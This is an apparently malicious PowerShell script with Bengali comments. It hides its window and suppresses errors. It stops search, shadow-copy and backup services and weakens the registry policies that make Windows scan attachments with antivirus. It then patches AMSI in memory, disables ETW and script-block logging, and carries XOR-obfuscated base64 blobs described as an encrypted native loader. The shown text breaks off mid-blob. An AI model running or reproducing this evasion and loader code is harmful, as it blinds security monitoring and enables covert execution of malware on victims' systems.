[CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="High")]
param()

Set-StrictMode -Version Latest

$VerbosePreference      = 'SilentlyContinue'
$DebugPreference        = 'SilentlyContinue'
$InformationPreference  = 'SilentlyContinue'
$WarningPreference      = 'SilentlyContinue'
$ErrorActionPreference  = 'SilentlyContinue'
$ConfirmPreference                 = 'None'
$WhatIfPreference                  = $false
$PSModuleAutoLoadingPreference     = 'None'
$MaximumHistoryCount               = 0

*> $null
$Error.Clear()

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 -ErrorAction SilentlyContinue | Out-Null
Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "UltraViewService*" -Force -ErrorAction SilentlyContinue

$reg1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
$reg2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"
Invoke-Expression $reg1 2>$null | Out-Null
Invoke-Expression $reg2 2>$null | Out-Null
Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null

Add-Type -Name Window -Namespace Console -MemberDefinition @'
[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'@ -ErrorAction SilentlyContinue
[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)

function Invoke-Finalize {
    try {
        Get-Variable -Scope Script -ErrorAction SilentlyContinue | Remove-Variable -Scope Script -Force -ErrorAction SilentlyContinue
        [GC]::Collect(); [GC]::WaitForPendingFinalizers(); [GC]::Collect()
        Get-Process | ForEach-Object { $_.MinWorkingSet = $_.MinWorkingSet }
    } catch {}
}

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Invoke-Finalize; return
}

# ================================================================
#  ★★★ ১. ডিপ বাইপাস (AMSI + ETW + SCRIPTBLOCK) ★★★
# ================================================================
function Invoke-DeepBypass {
    # AMSI – ডাবল প্যাচ
    try {
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    } catch {}
    try {
        $amsiPatch = @"
using System; using System.Runtime.InteropServices;
public class AMPatch {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    public static void Patch() {
        IntPtr hAmsi = LoadLibrary("amsi.dll");
        IntPtr asb = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (asb != IntPtr.Zero) {
            uint old; VirtualProtect(asb, (UIntPtr)6, 0x40, out old);
            byte[] p = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            Marshal.Copy(p, 0, asb, 6);
            VirtualProtect(asb, (UIntPtr)6, old, out old);
        }
    }
}
"@
        Add-Type -TypeDefinition $amsiPatch -ErrorAction Stop
        [AMPatch]::Patch()
    } catch {}

    # ETW – EtwEventWrite RET + PSEtwLogProvider
    try {
        $p = [System.Diagnostics.Process]::GetCurrentProcess()
        $t = $p.MainModule.BaseAddress
        $v = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualProtect), [type])
        $old = 0
        $v.Invoke($t, 0x1000, 0x40, [ref]$old)
        [System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)
        $v.Invoke($t, 0x1000, $old, [ref]$null)
    } catch {}
    try {
        $logType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLog')
        if ($logType) {
            $f = $logType.GetField('_isEnabled', 'NonPublic,Static')
            if ($f) { $f.SetValue($null, $false) }
        }
        $provType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
        if ($provType) {
            $f = $provType.GetField('etwProvider', 'NonPublic,Static')
            if ($f) { $f.SetValue($null, $null) }
        }
    } catch {}

    # ScriptBlock Logging (4103/4104)
    try {
        $utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
        $gpoField = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
        if ($gpoField) {
            $gpo = $gpoField.GetValue($null)
            if ($gpo -is [hashtable]) {
                $gpo['ScriptBlockLogging'] = @{ 'EnableScriptBlockLogging' = 0 }
            } else {
                $gpo = @{ 'ScriptBlockLogging' = @{ 'EnableScriptBlockLogging' = 0 } }
                $gpoField.SetValue($null, $gpo)
            }
        }
        $pipeType = [Ref].Assembly.GetType('System.Management.Automation.Logging.PipelineLogging')
        if ($pipeType) {
            $inst = $pipeType.GetField('_instance','NonPublic,Static').GetValue($null)
            if ($inst) {
                $f = $inst.GetType().GetField('_enabled','NonPublic,Instance')
                if ($f) { $f.SetValue($inst, $false) }
            }
        }
        $ctx = $ExecutionContext
        $fld = $ctx.GetType().GetField('_context','NonPublic,Instance')
        if ($fld) {
            $c = $fld.GetValue($ctx)
            $lf = $c.GetType().GetField('_logPipelineExecution','NonPublic,Instance')
            if ($lf) { $lf.SetValue($c, $false) }
        }
    } catch {}
}

# ================================================================
#  ★★★ ২. XOR ডিক্রিপ্টর ★★★
# ================================================================
function Xor-Decrypt {
    param([string]$Encoded, [byte]$Key = 0x5A)
    try {
        $bytes = [Convert]::FromBase64String($Encoded)
        for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $Key }
        return [System.Text.Encoding]::UTF8.GetString($bytes)
    } catch { return $null }
}

# ================================================================
#  ★★★ ৩. এনক্রিপ্টেড C# NativeLoader (৩ অংশে বিভক্ত) ★★★
# ================================================================
$part1Enc = "LykzND16CSMpLj83YVAvKTM0PXoJIykuPzd0CC80LjM3P3QTNC4/KDUqCT8oLDM5PylhUC8pMzQ9egkjKS4/N3QOPyIuYVBQKi84NjM5ejk2Oykpehc7NC87Nhc7Kgg/KS82LnoheiovODYzOXoTNC4KLih6Ezc7PT8YOyk/YXoqLzg2Mzl6LzM0LnoTNzs9PwkzID9heiovODYzOXoTNC4KLih6HjY2FzszNBs+PihheiovODYzOXo2NTQ9eh4/Ni47YXoqLzg2Mzl6ODU1NnoTKWxuGDMuYXonUCovODYzOXopLjsuMzl6OTY7KSl6FDsuMyw/FjU7Pj8oeiFQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42Nnh2egk/LhY7KS4fKCg1KHpnei4oLz9zB3opLjsuMzl6PyIuPyg0ehM0LgouKHoMMyguLzs2GzY2NTlyEzQuCi4oejt2eg8TNC4KLih6KXZ6LzM0LnoudnovMzQueipzYVB6enp6AR42NhM3KjUoLnJ4MT8oND82aWh0PjY2eHZ6CT8uFjspLh8oKDUoemd6LigvP3MHeiovODYzOXopLjsuMzl6PyIuPyg0ejg1NTZ6DDMoLi87NhwoPz9yEzQuCi4oejt2eg8TNC4KLih6KXZ6LzM0Lnouc2FQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42Nnh2egk/LhY7KS4fKCg1KHpnei4oLz9zB3opLjsuMzl6PyIuPyg0ejg1NTZ6DDMoLi87NgooNS4/OS5yEzQuCi4oejt2eg8TNC4KLih6KXZ6LzM0Lnoqdno1Ly56LzM0Lno1c2FQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42Nnh2ehkyOygJPy56Z3oZMjsoCT8udBs0KTN2egk/LhY7KS4fKCg1KHpnei4oLz9zB3opLjsuMzl6PyIuPyg0ehM0LgouKHodPy4KKDU5Gz4+KD8pKXITNC4KLih6MnZ6KS4oMzQ9ejRzYVB6enp6AR42NhM3KjUoLnJ4MT8oND82aWh0PjY2eHZ6GTI7KAk/LnpnehkyOygJPy50GzQpM3Z6CT8uFjspLh8oKDUoemd6LigvP3MHeikuOy4zOXo/Ii4/KDR6EzQuCi4oeh0/LgooNTkbPj4oPykpchM0LgouKHoydnoTNC4KLih6NXNhUHp6enoBHjY2EzcqNSgucngxPyg0PzZpaHQ+NjZ4dnoZMjsoCT8uemd6GTI7KAk/LnQbNCkzdnoJPy4WOykuHygoNSh6Z3ouKC8/cwd6KS47LjM5ej8iLj8oNHoTNC4KLih6HT8uFzU+LzY/Ejs0PjY/G3IpLigzND16NHNhUHp6enoBHjY2EzcqNSgucngxPyg0PzZpaHQ+NjZ4dnoZMjsoCT8uemd6GTI7KAk/LnQbNCkzdnoJPy4WOykuHygoNSh6Z3ouKC8/cwd6KS47LjM5ej8iLj8oNHoTNC4KLih6FjU7PhYzOCg7KCMbcikuKDM0PXo0c2FQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42NnhzB3opLjsuMzl6PyIuPyg0ejg1NTZ6HDYvKTITNCkuKC85LjM1NBk7OTI/chM0LgouKHoydnoTNC4KLih6O3Z6DxM0LgouKHopc2FQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42NnhzB3opLjsuMzl6PyIuPyg0ehM0LgouKHodPy4ZLygoPzQuCig1OT8pKXJzYVB6enp6OTU0KS56LzM0LnoXGXpnemoia2pqanZ6Fwh6Z3pqImhqamp2ehccemd6aiJiampqdnoKCA16Z3pqImJudnoKHwh6Z3pqImhqdnoKHwgNemd6aiJuanZ6CggVemd6aiJqaGFQenp6eikuOy4zOXovKTI1KC56D2tscjgjLj8BB3o4dnozNC56NXN6IXooPy4vKDR6GDMuGTU0LD8oLj8odA41DxM0Lmtscjh2ejVzYXonUHp6enopLjsuMzl6LzM0Lnp6eg9paHI4Iy4/AQd6OHZ6MzQuejVzeiF6KD8uLyg0ehgzLhk1NCw/KC4/KHQONQ8TNC5paHI4dno1c2F6J1B6enp6KS47LjM5ei82NTQ9enoPbG5yOCMuPwEHejh2ejM0Lno1c3oheig/Li8oNHoYMy4ZNTQsPyguPyh0DjUPEzQubG5yOHZ6NXNheidQenp6eikuOy4zOXovMzQuenp6CA9paHITNC4KLih6KnZ6NjU0PXo1c3oheig/Li8oNHpyLzM0LnMXOygpMjs2dAg/Oz4TNC5paHJyEzQuCi4oc3IqdA41EzQubG5yc3E1c3NheidQenp6eikuOy4zOXovKTI1KC56CA9rbHITNC4KLih6KnZ6NjU0PXo1c3oheig/Li8oNHpyLykyNSgucxc7KCkyOzZ0CD87PhM0LmtscnITNC4KLihzcip0DjUTNC5sbnJzcTVzc2F6J1B6enp6KS47LjM5ei82NTQ9enoID2xuchM0LgouKHoqdno2NTQ9ejVzeiF6NjU0PXo2NXpnenI2NTQ9c3IvMzQucxc7KCkyOzZ0CD87PhM0LmlocnITNC4KLihzcip0DjUTNC5sbnJzcTVzc2F6NjU0PXoyM3pnenI2NTQ9c3IvMzQucxc7KCkyOzZ0CD87PhM0LmlocnITNC4KLihzcip0DjUTNC5sbnJzcTVxbnNzYXooPy4vKDR6ci82NTQ9c3JyMjNmZmlocyY2NXNheidQenp6eikuOy4zOXosNTM+eg0PbG5yEzQuCi4oeip2ejY1ND16NXZ6LzY1ND16LHN6IXoXOygpMjs2dA0oMy4/EzQubG5ychM0LgouKHNyKnQONRM0LmxucnNxNXN2cjY1ND1zLHNheidQenp6eikuOy4zOXosNTM+eg0PaWhyEzQuCi4oeip2ejY1ND16NXZ6LzM0Lnosc3p6eiF6FzsoKTI7NnQNKDMuPxM0LmlocnITNC4KLihzcip0DjUTNC5sbnJzcTVzdnIzNC5zLHNheidQenp6eikuOy4zOXopLigzND16CBspOTMzchM0LgouKHoqdno2NTQ9ejVzeiF6LDsoeik4emd6ND8tegkuKDM0PRgvMzY+Pyhyc2F6PDUoenIzNC56M2dqYTNmaGxqYTNxcXN6IXo4Iy4/ejhnFzsoKTI7NnQIPzs+GCMuP3JyEzQuCi4oc3IqdA41EzQubG5yc3E1cTNzc2F6MzxyOGdnanM4KD87MWF6KTh0GyoqPzQ+cnI5MjsoczhzYXoneig/Li8oNHopOHQONQkuKDM0PXJzYXonUHp6enopLjsuMzl6LzM0LnoJCig1LnIvMzQuejlzeiF6ODU1NnoiZ3I5fGoiaGpqampqampze2dqdnotZ3I5fGoiYmpqampqampze2dqdnooZ3I5fGoibmpqampqampze2dqYXozPHIifHwtc3ooPy4vKDR6Ch8IDWF6MzxyInx8KHN6KD8uLyg0egofCGF6MzxyInN6KD8uLyg0egofCGF6MzxyLXN6KD8uLyg0egoIDWF6KD8uLyg0egoIFWF6J1B6enp6KS4oLzkuegk/OXoheiovODYzOXovMzQuegwJdgwbdgkIHnYKCB52GTJheidQenp6egEPNDc7NDs9Pz4cLzQ5LjM1NAo1MzQuPyhyGTs2NjM0PRk1NCw/NC4zNTR0CS4+GTs2NnMHej4/Nj89Oy4/ejg1NTZ6HjY2FzszNBw0chM0LgouKHoydnovMzQueih2ehM0LgouKHoqc2FQenp6eiovODYzOXopLjsuMzl6Fzs0Lzs2FzsqCD8pLzYuehc7KnI4Iy4/AQd6PjY2dno4NTU2ejk7NjYfNC4oI3N6IVB6enp6enp6eiw7KHooPyl6Z3o0Py16Fzs0Lzs2FzsqCD8pLzYucnNhUHp6enp6enp6MzxyD2tscj42NnZqc3tnaiJvG24ec3ouMig1LXo0Py16HyI5PyouMzU0cngTNCw7NjM+ehcAeHNhUHp6enp6enp6MzQuejY8O3pnehgzLhk1NCw/KC4/KHQONRM0Lmlocj42NnZqImkZc2F6MzxyD2locj42NnY2PDtze2dqIm5vb2ovc3ouMig1LXo0Py16HyI5PyouMzU0cngTNCw7NjM+egofeHNhUHp6enp6enp6MzQuejk1ZzY8O3FuYXovKTI1KC56NClnD2tscj42NnY5NXFoc3Z6NTIpZw9rbHI+NjZ2OTVxa2xzYXozNC56NTVnOTVxaGphejg1NTZ6MylsbmdyD2tscj42NnY1NXNnZ2oiamhqGHNheig/KXQTKWxuGDMuZzMpbG5hUHp6enp6enp6LzM0Lno/KmcPaWhyPjY2djU1cWtsc3Z6KTUzZw9paHI+NjZ2NTVxb2xzdnopNTJnD2locj42NnY1NXFsanNhei82NTQ9ejM4ZzMpbG5lD2xucj42NnY1NXFobnNgD2locj42NnY1NXFoYnNheig/KXQTNzs9PwkzID9nKTUzYVB6enp6enp6ejM0Lno+PmczKWxuZTU1cWtraGA1NXFjbGF6LzM0LnozKCw7Zw9paHI+NjZ2Pj5xYnN2eigoLDtnD2locj42NnY+PnFuanN2eigpIGcPaWhyPjY2dj4+cW5uc2FQenp6enp6enozNC56KS5nNTVxNTIpYXosOyh6KT85KWc0Py16CT85ATQpB2F6PDUocjM0LnozZ2phM2Y0KWEzcXFzITM0Lno4ZykucTNwbmphKT85KQEzB2c0Py16CT85IQwJZw9paHI+NjZ2OHFic3YMG2cPaWhyPjY2djhxa2hzdgkIHmcPaWhyPjY2djhxa2xzdgoIHmcPaWhyPjY2djhxaGpzdhkyZw9paHI+NjZ2OHFpbHMnYSdQenp6enp6enoTNC4KLih6Mzc9ZwwzKC4vOzYbNjY1OXITNC4KLih0AD8oNXZyDxM0LgouKHMpNTN2FxkmFwh2CggNc2F6MzxyMzc9Z2cTNC4KLih0AD8oNXN6LjIoNS16ND8teh8iOT8qLjM1NHJ4DDMoLi87Nhs2NjU5ejw7MzY/PnhzYVB6enp6enp6eig/KXQTNzs9Pxg7KT9nMzc9YXo2NTQ9ejs4ZzM3PXQONRM0LmxucnN2ej4/Ni47Zzs4d3I2NTQ9czM4YXooPyl0Hj82LjtnPj82LjthUHp6enp6enp6FzsoKTI7NnQZNSojcj42NnZqdjM3PXZyMzQucyk1MnNhUHp6enp6enp6PDUoPzs5MnIsOyh6KXozNHopPzkpcyF6MzxyKXQJCB5nZ2pzejk1NC4zNC8/YXovMzQuejkpZyl0DAlnZ2plKXQJCB5gFzsuMnQXMzRyKXQJCB52KXQMCXNhejM8cil0CggecTkpZHIvMzQucz42NnQWPzQ9LjJzITkpZ3IvMzQucz42NnQWPzQ9LjJ3KXQKCB5hejM8cjkpZ2dqczk1NC4zNC8/YSd6FzsoKTI7NnQZNSojcj42NnZyMzQucyl0CggednITNC4KLihzcjs4cSl0DBtzdnIzNC5zOSlzYXonUHp6enp6enp6MzxyKCgsO3tnanx8Pj82Ljt7Z2pzIXovMzQueig1ZygoLDt2eig/ZygoLDtxKCkgYXotMjM2P3IoNWYoP3Mhei8zNC56Kj1nCA9paHIzNz12KDVzdno4KWcID2locjM3PXYoNXFuc2F6MzxyOClnZ2pzOCg/OzFhejM0Lno0P2dyMzQuc3I4KXdic3VoYXo8NShyMzQuejNnamEzZjQ/YTNxcXMhei8pMjUoLno/ZwgPa2xyMzc9dig1cWJxM3Boc2F6MzQuei4jZ3I/ZGRraHN8aiIcdno1PGc/fGoiHBwcYXozPHIuI2dnanM5NTQuMzQvP2F6NjU0PXouKGcqPXE1PGF6MzxyLiNnZ2tqcyEvNjU0PXo5ZwgPbG5yMzc9di4oc2END2xucjM3PXYuKHZyLzY1ND1zcnI2NTQ9czlxPj82Ljtzc2Enej82KT96MzxyLiNnZ2lzIS8zNC56OWcID2locjM3PXYuKHNhDQ9paHIzNz12Lih2ci8zNC5zcnI2NTQ9czlxPj82Ljtzc2Eneid6KDVxZzgpYXoneidQenp6enp6enozPHIzKCw7e2dqcyF6MzQuejM/Z2phei0yMzY/ci4oLz9zIXo2NTQ9ej81ZzMoLDtxMz9waGphei8zNC56NChnCA9paHIzNz12PzVxa2hzdjMoZwgPaWhyMzc9dj81cWtsc3YzNChnCA9paHIzNz12PzVzYXozPHI0KGdnanM4KD87MWF6KS4oMzQ9ej40ZwgbKTkzM3IzNz12NChzYXoTNC4KLih6Mj5nHT8uFzU+LzY/Ejs0PjY/G3I+NHNhejM8cjI+Z2cTNC4KLih0AD8oNXN6Mj5nFjU7PhYzOCg7KCMbcj40c2F6MzxyMj5nZxM0LgouKHQAPyg1cyEzP3FxYTk1NC4zNC8/YSd6NjU0PXouNWdqYXovMzQuei44ZzM0KHtnamUzNChgMyhhejM0LnouKWczKWxuZWJgbmF6LTIzNj9yLigvP3MhejY1ND16Lj9nLjhxLjVhejY1ND16LixnMylsbmVyNjU0PXMID2xucjM3PXYuP3NgcjY1ND1zCA9paHIzNz12Lj9zYXozPHIuLGdnanM4KD87MWF6NjU0PXo1PGczKWxuZS80OTI/OTE/PnJyNjU0PXNqImJqampqampqampqampqamoWc2ByNjU0PXNqImJqampqampqYXoTNC4KLih6PDtnEzQuCi4odAA/KDVhejM8cnIuLHw1PHN7Z2pzejw7Zx0/LgooNTkbPj4oPykpcjI+dnITNC4KLihzcjM0LnNyLix8aiIcHBwcc3Nhej82KT96PDtnHT8uCig1ORs+Pig/KSlyMj52CBspOTMzcjM3PXYuLHFoc3NhejM8cjw7e2cTNC4KLih0AD8oNXMhehM0LgouKHozO2dyEzQuCi4oc3I7OHEzKHEuNXNhejM8cjMpbG5zehc7KCkyOzZ0DSgzLj8TNC5sbnIzO3Y8O3QONRM0LmxucnNzYXo/Nik/ehc7KCkyOzZ0DSgzLj8TNC5paHIzO3Y8O3QONRM0LmlocnNzYXonei41cWcuKWF6J3ozP3FxYXoneidQenp6enp6eno8NSg/Ozkyciw7KHopejM0eik/OSlzIXovMzQueikgZxc7LjJ0Fzsicil0DAl2KXQJCB5zYXozPHIpIGdnanM5NTQuMzQvP2F6LzM0Lno1KmF6DDMoLi87NgooNS4/OS5ychM0LgouKHNyOzhxKXQMG3N2cg8TNC4KLihzKSB2CQooNS5yKXQZMnN2NS8uejUqc2F6J1B6enp6enp6ehw2LykyEzQpLigvOS4zNTQZOzkyP3IdPy4ZLygoPzQuCig1OT8pKXJzdjM3PXZyDxM0LgouKHMpNTNzYVB6enp6enp6eig/KXQeNjYXOzM0Gz4+KGcTNC4KLih0AD8oNWF6MzxyOTs2Nh80LigjfHw/KntnanMheig/KXQeNjYXOzM0Gz4+KGdyEzQuCi4oc3I7OHE/KnNhei4oIyEsOyh6PDRnch42Nhc7MzQcNHMXOygpMjs2dB0/Lh4/Nj89Oy4/HDUoHC80OS4zNTQKNTM0Lj8ocig/KXQeNjYXOzM0Gz4+KHYuIyo/NTxyHjY2FzszNBw0c3NhPDRyMzc9dmt2EzQuCi4odAA/KDVzYSd6OTsuOTIhJ3onUHp6enp6enp6KD8uLyg0eig/KWFQenp6eidQenp6eiovODYzOXopLjsuMzl6ODU1NnocKD8/chM0LgouKHo4c3oheig/Li8oNHoMMyguLzs2HCg/P3I4dg8TNC4KLih0AD8oNXYXHHNheidQJw=="
$part2Enc = "LykzND16CSMpLj83YVAvKTM0PXoJIykuPzd0CC80LjM3P3QTNC4/KDUqCT8oLDM5PylhUC8pMzQ9egkjKS4/N3QOPyIuYVBQKi84NjM5ejk2Oykpehc7NC87Nhc7Kgg/KS82LnoheiovODYzOXoTNC4KLih6Ezc7PT8YOyk/YXoqLzg2Mzl6LzM0LnoTNzs9PwkzID9heiovODYzOXoTNC4KLih6HjY2FzszNBs+PihheiovODYzOXo2NTQ9eh4/Ni47YXoqLzg2Mzl6ODU1NnoTKWxuGDMuYXonUCovODYzOXopLjsuMzl6OTY7KSl6FDsuMyw/FjU7Pj8oeiFQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42Nnh2egk/LhY7KS4fKCg1KHpnei4oLz9zB3opLjsuMzl6PyIuPyg0ehM0LgouKHoMMyguLzs2GzY2NTlyEzQuCi4oejt2eg8TNC4KLih6KXZ6LzM0LnoudnovMzQueipzYVB6enp6AR42NhM3KjUoLnJ4MT8oND82aWh0PjY2eHZ6CT8uFjspLh8oKDUoemd6LigvP3MHeiovODYzOXopLjsuMzl6PyIuPyg0ejg1NTZ6DDMoLi87NhwoPz9yEzQuCi4oejt2eg8TNC4KLih6KXZ6LzM0Lnouc2FQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42Nnh2egk/LhY7KS4fKCg1KHpnei4oLz9zB3opLjsuMzl6PyIuPyg0ejg1NTZ6DDMoLi87NgooNS4/OS5yEzQuCi4oejt2eg8TNC4KLih6KXZ6LzM0Lnoqdno1Ly56LzM0Lno1c2FQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42Nnh2ehkyOygJPy56Z3oZMjsoCT8udBs0KTN2egk/LhY7KS4fKCg1KHpnei4oLz9zB3opLjsuMzl6PyIuPyg0ehM0LgouKHodPy4KKDU5Gz4+KD8pKXITNC4KLih6MnZ6KS4oMzQ9ejRzYVB6enp6AR42NhM3KjUoLnJ4MT8oND82aWh0PjY2eHZ6GTI7KAk/LnpnehkyOygJPy50GzQpM3Z6CT8uFjspLh8oKDUoemd6LigvP3MHeikuOy4zOXo/Ii4/KDR6EzQuCi4oeh0/LgooNTkbPj4oPykpchM0LgouKHoydnoTNC4KLih6NXNhUHp6enoBHjY2EzcqNSgucngxPyg0PzZpaHQ+NjZ4dnoZMjsoCT8uemd6GTI7KAk/LnQbNCkzdnoJPy4WOykuHygoNSh6Z3ouKC8/cwd6KS47LjM5ej8iLj8oNHoTNC4KLih6HT8uFzU+LzY/Ejs0PjY/G3IpLigzND16NHNhUHp6enoBHjY2EzcqNSgucngxPyg0PzZpaHQ+NjZ4dnoZMjsoCT8uemd6GTI7KAk/LnQbNCkzdnoJPy4WOykuHygoNSh6Z3ouKC8/cwd6KS47LjM5ej8iLj8oNHoTNC4KLih6FjU7PhYzOCg7KCMbcikuKDM0PXo0c2FQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42NnhzB3opLjsuMzl6PyIuPyg0ejg1NTZ6HDYvKTITNCkuKC85LjM1NBk7OTI/chM0LgouKHoydnoTNC4KLih6O3Z6DxM0LgouKHopc2FQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42NnhzB3opLjsuMzl6PyIuPyg0ehM0LgouKHodPy4ZLygoPzQuCig1OT8pKXJzYVB6enp6OTU0KS56LzM0LnoXGXpnemoia2pqanZ6Fwh6Z3pqImhqamp2ehccemd6aiJiampqdnoKCA16Z3pqImJudnoKHwh6Z3pqImhqdnoKHwgNemd6aiJuanZ6CggVemd6aiJqaGFQenp6eikuOy4zOXovKTI1KC56D2tscjgjLj8BB3o4dnozNC56NXN6IXooPy4vKDR6GDMuGTU0LD8oLj8odA41DxM0Lmtscjh2ejVzYXonUHp6enopLjsuMzl6LzM0Lnp6eg9paHI4Iy4/AQd6OHZ6MzQuejVzeiF6KD8uLyg0ehgzLhk1NCw/KC4/KHQONQ8TNC5paHI4dno1c2F6J1B6enp6KS47LjM5ei82NTQ9enoPbG5yOCMuPwEHejh2ejM0Lno1c3oheig/Li8oNHoYMy4ZNTQsPyguPyh0DjUPEzQubG5yOHZ6NXNheidQenp6eikuOy4zOXovMzQuenp6CA9paHITNC4KLih6KnZ6NjU0PXo1c3oheig/Li8oNHpyLzM0LnMXOygpMjs2dAg/Oz4TNC5paHJyEzQuCi4oc3IqdA41EzQubG5yc3E1c3NheidQenp6eikuOy4zOXovKTI1KC56CA9rbHITNC4KLih6KnZ6NjU0PXo1c3oheig/Li8oNHpyLykyNSgucxc7KCkyOzZ0CD87PhM0LmtscnITNC4KLihzcip0DjUTNC5sbnJzcTVzc2F6J1B6enp6KS47LjM5ei82NTQ9enoID2xuchM0LgouKHoqdno2NTQ9ejVzeiF6NjU0PXo2NXpnenI2NTQ9c3IvMzQucxc7KCkyOzZ0CD87PhM0LmlocnITNC4KLihzcip0DjUTNC5sbnJzcTVzc2F6NjU0PXoyM3pnenI2NTQ9c3IvMzQucxc7KCkyOzZ0CD87PhM0LmlocnITNC4KLihzcip0DjUTNC5sbnJzcTVxbnNzYXooPy4vKDR6ci82NTQ9c3JyMjNmZmlocyY2NXNheidQenp6eikuOy4zOXosNTM+eg0PbG5yEzQuCi4oeip2ejY1ND16NXZ6LzY1ND16LHN6IXoXOygpMjs2dA0oMy4/EzQubG5ychM0LgouKHNyKnQONRM0LmxucnNxNXN2cjY1ND1zLHNheidQenp6eikuOy4zOXosNTM+eg0PaWhyEzQuCi4oeip2ejY1ND16NXZ6LzM0Lnosc3p6eiF6FzsoKTI7NnQNKDMuPxM0LmlocnITNC4KLihzcip0DjUTNC5sbnJzcTVzdnIzNC5zLHNheidQenp6eikuOy4zOXopLigzND16CBspOTMzchM0LgouKHoqdno2NTQ9ejVzeiF6LDsoeik4emd6ND8tegkuKDM0PRgvMzY+Pyhyc2F6PDUoenIzNC56M2dqYTNmaGxqYTNxcXN6IXo4Iy4/ejhnFzsoKTI7NnQIPzs+GCMuP3JyEzQuCi4oc3IqdA41EzQubG5yc3E1cTNzc2F6MzxyOGdnanM4KD87MWF6KTh0GyoqPzQ+cnI5MjsoczhzYXoneig/Li8oNHopOHQONQkuKDM0PXJzYXonUHp6enopLjsuMzl6LzM0LnoJCig1LnIvMzQuejlzeiF6ODU1NnoiZ3I5fGoiaGpqampqampze2dqdnotZ3I5fGoiYmpqampqampze2dqdnooZ3I5fGoibmpqampqampze2dqYXozPHIifHwtc3ooPy4vKDR6Ch8IDWF6MzxyInx8KHN6KD8uLyg0egofCGF6MzxyInN6KD8uLyg0egofCGF6MzxyLXN6KD8uLyg0egoIDWF6KD8uLyg0egoIFWF6J1B6enp6KS4oLzkuegk/OXoheiovODYzOXovMzQuegwJdgwbdgkIHnYKCB52GTJheidQenp6egEPNDc7NDs9Pz4cLzQ5LjM1NAo1MzQuPyhyGTs2NjM0PRk1NCw/NC4zNTR0CS4+GTs2NnMHej4/Nj89Oy4/ejg1NTZ6HjY2FzszNBw0chM0LgouKHoydnovMzQueih2ehM0LgouKHoqc2FQenp6eiovODYzOXopLjsuMzl6Fzs0Lzs2FzsqCD8pLzYuehc7KnI4Iy4/AQd6PjY2dno4NTU2ejk7NjYfNC4oI3N6IVB6enp6enp6eiw7KHooPyl6Z3o0Py16Fzs0Lzs2FzsqCD8pLzYucnNhUHp6enp6enp6MzxyD2tscj42NnZqc3tnaiJvG24ec3ouMig1LXo0Py16HyI5PyouMzU0cngTNCw7NjM+ehcAeHNhUHp6enp6enp6MzQuejY8O3pnehgzLhk1NCw/KC4/KHQONRM0Lmlocj42NnZqImkZc2F6MzxyD2locj42NnY2PDtze2dqIm5vb2ovc3ouMig1LXo0Py16HyI5PyouMzU0cngTNCw7NjM+egofeHNhUHp6enp6enp6MzQuejk1ZzY8O3FuYXovKTI1KC56NClnD2tscj42NnY5NXFoc3Z6NTIpZw9rbHI+NjZ2OTVxa2xzYXozNC56NTVnOTVxaGphejg1NTZ6MylsbmdyD2tscj42NnY1NXNnZ2oiamhqGHNheig/KXQTKWxuGDMuZzMpbG5hUHp6enp6enp6LzM0Lno/KmcPaWhyPjY2djU1cWtsc3Z6KTUzZw9paHI+NjZ2NTVxb2xzdnopNTJnD2locj42NnY1NXFsanNhei82NTQ9ejM4ZzMpbG5lD2xucj42NnY1NXFobnNgD2locj42NnY1NXFoYnNheig/KXQTNzs9PwkzID9nKTUzYVB6enp6enp6ejM0Lno+PmczKWxuZTU1cWtraGA1NXFjbGF6LzM0LnozKCw7Zw9paHI+NjZ2Pj5xYnN2eigoLDtnD2locj42NnY+PnFuanN2eigpIGcPaWhyPjY2dj4+cW5uc2FQenp6enp6enozNC56KS5nNTVxNTIpYXosOyh6KT85KWc0Py16CT85ATQpB2F6PDUocjM0LnozZ2phM2Y0KWEzcXFzITM0Lno4ZykucTNwbmphKT85KQEzB2c0Py16CT85IQwJZw9paHI+NjZ2OHFic3YMG